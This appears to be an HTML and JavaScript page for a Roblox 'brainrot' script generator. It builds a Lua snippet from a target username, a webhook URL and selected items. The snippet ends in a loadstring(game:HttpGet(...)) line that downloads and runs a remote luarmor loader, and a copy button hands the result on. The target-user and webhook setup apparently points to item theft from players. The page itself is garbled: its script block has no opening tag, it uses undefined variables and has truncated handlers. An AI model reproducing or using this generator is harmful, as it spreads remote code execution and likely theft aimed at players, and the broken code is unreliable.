<!DOCTYPE html>
<html lang="en">
<head>

<style>
  
*{margin:0;padding:0;box-sizing:border-box}
  .links-banner{display:flex;align-items:center;justify-content:center;gap:10px;padding:8px 14px;background:rgba(230,57,70,0.06);border:1px solid rgba(230,57,70,0.15);border-radius:10px;font-family:var(--font-mono);font-size:11px;text-align:center;flex-wrap:wrap}
  .links-banner a{color:#ff8b8b;text-decoration:none;transition:color .2s}
  .links-banner a:hover{color:#fff}
  .links-sep{color:#333}
:root{
  --red:#e63946;
  --red-dim:#c1121f;
  --bg:#0a0a0a;
  --bg-card:#111111;
  --muted:#555;
  --muted2:#1e1e1e;
  --font-display:'Space Grotesk',system-ui,sans-serif;
  --font-body:'Inter',system-ui,sans-serif;
  --font-mono:'JetBrains Mono',monospace;
}
body{background:var(--bg);color:#fff;font-family:var(--font-body);min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}

.grid-bg{position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(230,57,70,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(230,57,70,0.04) 1px,transparent 1px);background-size:60px 60px;mask-image:radial-gradient(ellipse 80% 60% at 50% 50%,black 40%,transparent 100%);-webkit-mask-image:radial-gradient(ellipse 80% 60% at 50% 50%,black 40%,transparent 100%)}
.bg-orb{position:fixed;border-radius:50%;pointer-events:none;z-index:0}

nav{display:flex;align-items:center;justify-content:space-between;padding:0 1.25rem;height:56px;border-bottom:1px solid #1a1a1a;position:relative;z-index:10}
.logo{display:flex;align-items:center;gap:8px;font-family:var(--font-display);font-weight:900;font-size:15px;text-decoration:none;color:#fff;letter-spacing:-.02em}
.logo-icon{background:var(--red);border-radius:5px;width:26px;height:26px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
.logo-icon img{width:100%;height:100%;object-fit:cover}
.nav-btns{display:flex;gap:8px}
.nav-btn-red{background:var(--red);border:none;color:#fff;padding:6px 14px;border-radius:6px;font-size:13px;text-decoration:none;display:inline-flex;align-items:center;font-family:var(--font-body);font-weight:600}

main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:2rem 1rem;position:relative;z-index:1}
.container{width:100%;max-width:560px;display:flex;flex-direction:column;gap:16px}

.card{background:var(--bg-card);border:1px solid var(--muted2);border-radius:14px;overflow:hidden;position:relative}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(230,57,70,0.3),transparent)}
.card-header{padding:1rem 1.25rem;border-bottom:1px solid #1a1a1a;display:flex;align-items:center;justify-content:space-between}
.card-header h2{font-family:var(--font-display);font-size:13px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;color:#888}
.card-body{padding:1.25rem;display:flex;flex-direction:column;gap:14px}

.label{font-size:10px;font-weight:700;color:#555;letter-spacing:.6px;text-transform:uppercase;font-family:var(--font-mono);display:block;margin-bottom:6px}

.inp{background:#0d0d0d;border:1px solid #1e1e1e;border-radius:8px;padding:10px 13px;width:100%;color:#fff;font-family:var(--font-mono);font-size:13px;transition:border-color .2s,box-shadow .2s;outline:none}
.inp:focus{border-color:rgba(230,57,70,.4);box-shadow:0 0 0 3px rgba(230,57,70,.07)}
.inp::placeholder{color:#333}

.modes{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
.mode-btn{background:#0d0d0d;border:1px solid #1e1e1e;border-radius:8px;padding:10px 6px;font-size:11px;font-weight:700;color:#444;font-family:var(--font-mono);cursor:pointer;transition:all .2s;text-align:center;text-transform:uppercase;letter-spacing:.5px}
.mode-btn:hover{border-color:#333;color:#888}
.mode-btn.active{background:rgba(230,57,70,.1);border-color:var(--red);color:#fff}

.brainrot-grid{display:flex;flex-wrap:wrap;gap:6px;max-height:180px;overflow-y:auto;padding-right:4px}
.brainrot-grid::-webkit-scrollbar{width:3px}
.brainrot-grid::-webkit-scrollbar-thumb{background:var(--red);border-radius:10px}
.pill{background:#0d0d0d;border:1px solid #1e1e1e;border-radius:6px;padding:5px 10px;font-size:10px;font-weight:600;color:#444;cursor:pointer;transition:all .2s;font-family:var(--font-mono);user-select:none}
.pill:hover{border-color:#333;color:#777}
.pill.active{background:rgba(230,57,70,.1);border-color:var(--red);color:#fff}
.brainrot-actions button{font-size:10px;font-weight:700;color:var(--red);background:none;border:none;cursor:pointer;font-family:var(--font-mono);letter-spacing:.3px;text-transform:uppercase}
.brainrot-actions button:hover{color:#ff6b78}
.count-text{font-size:10px;color:#333;font-family:var(--font-mono);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}

.gen-btn{background:var(--red);color:#fff;border:none;padding:14px;border-radius:9px;font-size:13px;font-weight:700;cursor:pointer;width:100%;font-family:var(--font-body);letter-spacing:.5px;text-transform:uppercase;transition:opacity .2s,box-shadow .2s;box-shadow:0 0 24px rgba(230,57,70,.2)}
.gen-btn:hover{opacity:.88;box-shadow:0 0 36px rgba(230,57,70,.35)}

.output-card{display:none}
.copy-btn{background:#1a1a1a;border:1px solid #2a2a2a;color:#fff;padding:6px 12px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;font-family:var(--font-mono);transition:background .2s}
.copy-btn:hover{background:#222}
.script-box{background:#0d0d0d;border:1px solid #1e1e1e;border-radius:8px;padding:1rem;font-family:var(--font-mono);font-size:12px;color:#e63946;overflow-x:auto;white-space:pre-wrap;word-break:break-all;line-height:1.7;margin-top:10px;max-height:260px;overflow-y:auto}
.script-box::-webkit-scrollbar{width:3px;height:3px}
.script-box::-webkit-scrollbar-thumb{background:var(--red);border-radius:10px}

footer{text-align:center;padding:1.5rem;color:#222;font-size:12px;border-top:1px solid #111;position:relative;z-index:1}

@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
.container{animation:fadeUp .4s ease both}

@media(max-width:480px){
  nav{padding:0 1rem}
  main{padding:1.25rem .75rem}
  .modes{grid-template-columns:repeat(2,1fr)}
  .card-body{padding:1rem}
  .card-header{padding:.875rem 1rem}
  .brainrot-grid{max-height:220px}
  .pill{font-size:9px;padding:4px 8px}
  .inp{font-size:12px}
  .gen-btn{padding:12px;font-size:12px}
}
</style>
</head>
<body>

const selected = new Set()
let currentMode = "normal"

const c = document.getElementById("brainrot-container")
let currentFiltered = brainrots

brainrots.forEach(name => {
  const p = document.createElement("div")
  p.className = "pill"
  p.textContent = name
  c.appendChild(p)
})

c.addEventListener("click", e => {
  const pill = e.target.closest(".pill")
  if (!pill) return
  const name = pill.textContent
  selected.has(name) ? selected.delete(name) : selected.add(name)
  pill.classList.toggle("active", selected.has(name))
  document.getElementById("count-text").textContent = selected.size + " selected"
})

document.getElementById("brainrot-search").addEventListener("input", e => {
  const term = e.target.value.toLowerCase()
  currentFiltered = brainrots.filter(n => n.toLowerCase().includes(term))
  c.innerHTML = ""
  currentFiltered.forEach(name => {
    const p = document.createElement("div")
    p.className = "pill" + (selected.has(name) ? " active" : "")
    p.textContent = name
    c.appendChild(p)
  })
})

document.querySelector(".select-all-btn").addEventListener("click", () => {
  brainrots.forEach(n => selected.add(n))
  c.querySelectorAll(".pill").forEach(p => p.classList.add("active"))
  document.getElementById("count-text").textContent = selected.size + " selected"
})

document.querySelector(".deselect-all-btn").addEventListener("click", () => {
  selected.clear()
  c.querySelectorAll(".pill").forEach(p => p.classList.remove("active"))
  document.getElementById("count-text").textContent = "0 selected"
})

;["normal","freeze","duels","insta"].forEach(m => {

    currentMode = m
    ;["normal","freeze","duels","insta"].forEach(x => {
      document.getElementById("btn-" + x).className = "mode-btn" + (x === m ? " active" : "")

  const user = document.getElementById("roblox-username").value.trim() || "USER"
  const webhook = document.getElementById("webhook").value.trim() || "WEBHOOK"
  const loader = LOADERS[currentMode]
  const bTable = Array.from(selected).map(b => `    ["${b}"] = true`).join(",\n")
  const script = `getgenv().TARGET_USER = "${user}"
getgenv().WEBHOOK_URL = "${webhook}"
getgenv().NORMAL_BRAINROTS = {

}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/${loader}.lua", true))()`
  document.getElementById("script-display").textContent = script
  document.getElementById("output-card").style.display = "block"
  document.getElementById("output-card").scrollIntoView({ behavior: "smooth", block: "nearest" })
})

document.querySelector(".copy-btn").addEventListener("click", () => {
  const text = document.getElementById("script-display").textContent
  navigator.clipboard.writeText(text).then(() => {
    const btn = document.querySelector(".copy-btn")
    btn.textContent = "Copied!"
    setTimeout(() => btn.textContent = "Copy", 2000)
  })
})
</script>
